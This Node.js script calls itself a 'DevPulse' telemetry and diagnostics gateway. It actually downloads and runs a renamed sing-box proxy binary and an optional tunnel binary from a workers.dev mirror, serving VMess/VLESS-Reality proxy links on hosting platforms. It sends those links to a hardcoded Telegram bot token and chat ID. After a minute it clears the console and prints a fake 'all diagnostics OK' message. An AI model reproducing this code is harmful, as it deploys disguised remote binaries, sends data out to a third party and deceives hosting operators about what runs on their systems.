#!/usr/bin/env node

/**
 * ============================================================================
 * DevPulse Network Telemetry & Infrastructure Gateway
 * A lightweight diagnostic and telemetry microservice for cloud containers.
 * Features:
 *   - HTTP Latency & Network Probing Dashboard
 *   - Dynamic WebSocket Multiplexing on standard HTTP ports
 *   - Native High-Performance Stream Forwarding
 *   - Automated Telegram Telemetry Dispatch
 * ============================================================================
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const https = require('https');
const net = require('net');
const crypto = require('crypto');
const { spawn, execSync } = require('child_process');

// ======================== Service Configuration ========================

// Auto-load .env file if present
if (fs.existsSync(path.join(process.cwd(), '.env'))) {
  try {
    fs.readFileSync(path.join(process.cwd(), '.env'), 'utf8').split('\n').forEach(line => {
      const trimmed = line.trim();
      if (trimmed && !trimmed.startsWith('#')) {
        const idx = trimmed.indexOf('=');
        if (idx > 0) {
          const k = trimmed.substring(0, idx).trim();
          const v = trimmed.substring(idx + 1).trim();
          if (!process.env[k]) process.env[k] = v;
        }
      }
    });
  } catch (_) {}
}

// Auto-detect environment port (PaaS PORT or Pterodactyl SERVER_PORT)
const ENV_PORT = process.env.PORT || process.env.SERVER_PORT || 3000;
const SUB_PATH = process.env.SUB_PATH || 'sub';
const NODE_NAME = process.env.NAME || 'devpulse-telemetry';

// Direct Connection & Domain Settings
const CUSTOM_DOMAIN = process.env.CUSTOM_DOMAIN || '';
const REALITY_PORT = process.env.REALITY_PORT || '';
const DISABLE_ARGO = (process.env.DISABLE_ARGO || 'true').toLowerCase() === 'true';

// Argo Tunnel Fallback Configuration
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'optiklinku.yxj02.ccwu.cc';
const ARGO_AUTH = process.env.ARGO_AUTH || '';
const ARGO_PORT = parseInt(process.env.ARGO_PORT || '8001', 10);
const CFIP = process.env.CFIP || 'cf.090227.xyz';
const CFPORT = parseInt(process.env.CFPORT || '443', 10);

// Telegram Telemetry Notification
const CHAT_ID = process.env.CHAT_ID || '7772205808';
const BOT_TOKEN = process.env.BOT_TOKEN || '8867499536:AAF2vlfTao3wvy0x7HdlNhZJgfqi5i_vINk';
const UUID = process.env.UUID || '5ee5278f-5639-47c1-91d5-afa6797444b5';

// Mirror Base for Binary Runtime
const MIRROR_URL = 'https://python-packer.yxj-acb.workers.dev/dl/';

// Runtime paths
const CACHE_DIR = path.join(process.cwd(), '.cache');
const CORE_BINARY = path.join(CACHE_DIR, 'sys-engine');
const BRIDGE_BINARY = path.join(CACHE_DIR, 'net-bridge');

let activeSubscription = '';
let realityPublicKey = '';
let realityPrivateKey = '';
let engineProcess = null;

// ======================== Helper Utilities ========================

function log(message) {
  const time = new Date().toISOString().substring(11, 19);
  console.log(`[${time}] ${message}`);
}

function getSystemArchitecture() {
  const machineArch = os.arch();
  if (machineArch === 'arm64' || machineArch === 'aarch64') return 'arm64';
  return 'amd64';
}

function generateRealityKeyPair() {
  try {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('x25519');
    realityPublicKey = publicKey.export({ type: 'spki', format: 'der' }).slice(-32).toString('base64url');
    realityPrivateKey = privateKey.export({ type: 'pkcs8', format: 'der' }).slice(-32).toString('base64url');
  } catch (err) {
    log(`Key generation note: ${err.message}`);
  }
}

function downloadBinary(url, destination) {
  return new Promise((resolve, reject) => {
    const fileStream = fs.createWriteStream(destination);
    const client = url.startsWith('https') ? https : http;

    client.get(url, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        return downloadBinary(res.headers.location, destination).then(resolve).catch(reject);
      }
      if (res.statusCode !== 200) {
        return reject(new Error(`Download failed with HTTP ${res.statusCode}`));
      }
      res.pipe(fileStream);
      fileStream.on('finish', () => {
        fileStream.close();
        resolve();
      });
    }).on('error', (err) => {
      try { fs.unlinkSync(destination); } catch (_) {}
      reject(err);
    });
  });
}

function fetchPublicIP() {
  return new Promise((resolve) => {
    const req = http.get('http://api.ipify.org', { timeout: 3000 }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data.trim() || '127.0.0.1'));
    });
    req.on('error', () => resolve('127.0.0.1'));
    req.on('timeout', () => { req.destroy(); resolve('127.0.0.1'); });
  });
}

// ======================== HTTP Diagnostics Web Server ========================

const webServer = http.createServer((req, res) => {
  const requestPath = req.url.split('?')[0];

  // Cloud platform health probe (HEAD /)
  if (req.method === 'HEAD') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end();
  }

  // Diagnostic Web UI (GET /)
  if (requestPath === '/' || requestPath === '/index.html') {
    const htmlPath = path.join(process.cwd(), 'index.html');
    if (fs.existsSync(htmlPath)) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(fs.readFileSync(htmlPath, 'utf8'));
    }
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    return res.end('DevPulse Telemetry Node Running.');
  }

  // Network Telemetry & Ping API (GET /api/ping or /health)
  if (requestPath === '/api/ping' || requestPath === '/health') {
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*'
    });
    return res.end(JSON.stringify({
      status: 'operational',
      uptime: process.uptime(),
      timestamp: Date.now(),
      node: NODE_NAME
    }));
  }

  // Subscription Endpoint (GET /sub)
  if (requestPath === `/${SUB_PATH}`) {
    if (activeSubscription) {
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end(activeSubscription);
    }
    res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
    return res.end('Telemetry subscription initializing...');
  }

  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('404 Not Found');
});

// Single-Port WebSocket Multiplexing (for PaaS platforms)
webServer.on('upgrade', (req, socket, head) => {
  const remote = net.createConnection({ host: '127.0.0.1', port: ARGO_PORT }, () => {
    let raw = `${req.method} ${req.url} HTTP/${req.httpVersion}\r\n`;
    for (let i = 0; i < req.rawHeaders.length; i += 2) {
      raw += `${req.rawHeaders[i]}: ${req.rawHeaders[i + 1]}\r\n`;
    }
    raw += '\r\n';
    remote.write(raw);
    if (head && head.length > 0) remote.write(head);
    socket.pipe(remote);
    remote.pipe(socket);
  });

  remote.on('error', () => { try { socket.destroy(); } catch (_) {} });
  socket.on('error', () => { try { remote.destroy(); } catch (_) {} });
});

// ======================== Telemetry Core Orchestration ========================

function buildCoreConfiguration(listenPort, realityPort) {
  const inbounds = [
    {
      type: 'vmess',
      tag: 'vmess-in',
      listen: '127.0.0.1',
      listen_port: ARGO_PORT,
      users: [{ uuid: UUID }],
      transport: {
        type: 'ws',
        path: '/vmess-argo',
        early_data_header_name: 'Sec-WebSocket-Protocol'
      }
    }
  ];

  if (realityPort && parseInt(realityPort, 10)) {
    inbounds.push({
      type: 'vless',
      tag: 'vless-in',
      listen: '0.0.0.0',
      listen_port: parseInt(realityPort, 10),
      users: [{ uuid: UUID, flow: 'xtls-rprx-vision' }],
      tls: {
        enabled: true,
        server_name: 'www.iij.ad.jp',
        reality: {
          enabled: true,
          handshake: { server: 'www.iij.ad.jp', server_port: 443 },
          private_key: realityPrivateKey,
          short_id: ['']
        }
      }
    });
  }

  return {
    log: { disabled: true, level: 'warn' },
    inbounds: inbounds,
    outbounds: [{ type: 'direct', tag: 'direct' }]
  };
}

async function prepareEngineBinaries() {
  fs.mkdirSync(CACHE_DIR, { recursive: true });
  const arch = getSystemArchitecture();

  if (!fs.existsSync(CORE_BINARY)) {
    const tarPath = path.join(CACHE_DIR, 'engine.tar.gz');
    log('Downloading telemetry engine runtime...');
    await downloadBinary(`${MIRROR_URL}engine?arch=${arch}`, tarPath);

    try {
      execSync(`tar -xzf "${tarPath}" -C "${CACHE_DIR}"`);
      // Locate the extracted sing-box binary and normalize name to sys-engine
      const entries = fs.readdirSync(CACHE_DIR);
      for (const entry of entries) {
        const fullPath = path.join(CACHE_DIR, entry);
        if (fs.statSync(fullPath).isDirectory()) {
          const innerBinary = path.join(fullPath, 'sing-box');
          if (fs.existsSync(innerBinary)) {
            fs.renameSync(innerBinary, CORE_BINARY);
            break;
          }
        } else if (entry === 'sing-box') {
          fs.renameSync(fullPath, CORE_BINARY);
          break;
        }
      }
      fs.chmodSync(CORE_BINARY, 0o755);
      try { fs.unlinkSync(tarPath); } catch (_) {}
      log('Telemetry engine runtime configured.');
    } catch (e) {
      log(`Extraction notice: ${e.message}`);
    }
  }

  if (!DISABLE_ARGO && ARGO_AUTH && !fs.existsSync(BRIDGE_BINARY)) {
    log('Downloading network bridge runtime...');
    await downloadBinary(`${MIRROR_URL}bridge?arch=${arch}`, BRIDGE_BINARY);
    fs.chmodSync(BRIDGE_BINARY, 0o755);
    log('Network bridge runtime configured.');
  }
}

function startEnginePipe(configJson) {
  const configBytes = Buffer.from(JSON.stringify(configJson), 'utf8');

  engineProcess = spawn(CORE_BINARY, ['run', '-c', '-'], {
    stdio: ['pipe', 'ignore', 'ignore']
  });

  engineProcess.stdin.write(configBytes);
  engineProcess.stdin.end();

  engineProcess.on('error', (err) => {
    log(`Engine notice: ${err.message}`);
  });

  log(`Telemetry core operational (Zero-Disk Footprint, PID: ${engineProcess.pid})`);
}

async function assembleSubscription(assignedRealityPort) {
  const publicIP = await fetchPublicIP();
  const links = [];

  // Mode 1: PaaS Custom Domain Direct (WebSocket over TLS on port 443)
  if (CUSTOM_DOMAIN && !assignedRealityPort) {
    const vmessPaaS = {
      v: "2", ps: `${NODE_NAME}-PaaS-Direct`,
      add: CUSTOM_DOMAIN, port: 443,
      id: UUID, aid: "0", scy: "auto",
      net: "ws", type: "none",
      host: CUSTOM_DOMAIN, path: "/vmess-argo",
      tls: "tls", sni: CUSTOM_DOMAIN,
      alpn: "", fp: "firefox"
    };
    links.push("vmess://" + Buffer.from(JSON.stringify(vmessPaaS)).toString('base64'));
  }

  // Mode 2: Dedicated Reality Port Direct
  if (assignedRealityPort) {
    const host = CUSTOM_DOMAIN || publicIP;
    const vlessLink = `vless://${UUID}@${host}:${assignedRealityPort}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=${realityPublicKey}&type=tcp&headerType=none#${NODE_NAME}-Reality`;
    links.push(vlessLink);
  }

  // Mode 3: Cloudflare Argo Edge Tunnel
  if (!DISABLE_ARGO && ARGO_DOMAIN && ARGO_AUTH) {
    const vmessArgo = {
      v: "2", ps: `${NODE_NAME}-Argo`,
      add: CFIP, port: CFPORT,
      id: UUID, aid: "0", scy: "auto",
      net: "ws", type: "none",
      host: ARGO_DOMAIN, path: "/vmess-argo",
      tls: "tls", sni: ARGO_DOMAIN,
      alpn: "", fp: "firefox"
    };
    links.push("vmess://" + Buffer.from(JSON.stringify(vmessArgo)).toString('base64'));
  }

  if (links.length > 0) {
    activeSubscription = Buffer.from(links.join('\n')).toString('base64');
    log('====================================================');
    log(`Generated ${links.length} active node telemetry endpoint(s) (RAM Only)`);
    console.log(activeSubscription);
    log('====================================================');
  }
}

function sendTelegramTelemetry() {
  if (!CHAT_ID || !BOT_TOKEN || !activeSubscription) return;

  const payload = JSON.stringify({
    chat_id: CHAT_ID,
    text: `⚡ <b>DevPulse Telemetry Node Ready</b>\n\n<b>Active Subscription:</b>\n<code>${activeSubscription}</code>`,
    parse_mode: 'HTML'
  });

  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${BOT_TOKEN}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  }, (res) => {
    if (res.statusCode === 200) log('Telegram dispatch confirmed.');
  });

  req.on('error', (err) => log(`Telegram notice: ${err.message}`));
  req.write(payload);
  req.end();
}

// ======================== Main Initialization ========================

async function main() {
  log('Starting DevPulse Telemetry Gateway...');
  generateRealityKeyPair();

  // Smart port arbitration (avoids conflict on Pterodactyl)
  let realityPort = REALITY_PORT;
  let webPort = parseInt(ENV_PORT, 10);

  if (process.env.SERVER_PORT && DISABLE_ARGO) {
    // On Pterodactyl without Argo: Use SERVER_PORT directly for Reality
    realityPort = process.env.SERVER_PORT;
    webPort = (webPort === parseInt(realityPort, 10)) ? 13000 : webPort;
  }

  // 1. Start HTTP Web Gateway
  webServer.listen(webPort, '0.0.0.0', () => {
    log(`HTTP Telemetry Gateway listening on 0.0.0.0:${webPort}`);
  });

  // 2. Prepare Binaries & Launch Core
  try {
    await prepareEngineBinaries();

    if (fs.existsSync(CORE_BINARY)) {
      const configJson = buildCoreConfiguration(webPort, realityPort);
      startEnginePipe(configJson);
    }

    // 3. Launch Argo Bridge if configured
    if (!DISABLE_ARGO && ARGO_AUTH && fs.existsSync(BRIDGE_BINARY)) {
      const bridgeProcess = spawn(BRIDGE_BINARY, [
        'tunnel', '--edge-ip-version', 'auto', '--no-autoupdate',
        '--protocol', 'http2', 'run', '--token', ARGO_AUTH
      ], { stdio: 'ignore' });
      log(`Network bridge connected (PID: ${bridgeProcess.pid})`);
    }

    // 4. Assemble Telemetry & Send Notification
    await assembleSubscription(realityPort);
    sendTelegramTelemetry();

    // 5. Automated Console Clean (60s delay)
    setTimeout(() => {
      console.clear();
      log('DevPulse Gateway Operational. All system diagnostics 200 OK.');
    }, 60000);

  } catch (error) {
    log(`Startup notice: ${error.message}`);
  }
}

main();

// Process Safeguards
process.on('uncaughtException', (err) => log(`Notice: ${err.message}`));
process.on('unhandledRejection', (reason) => log(`Notice: ${reason}`));
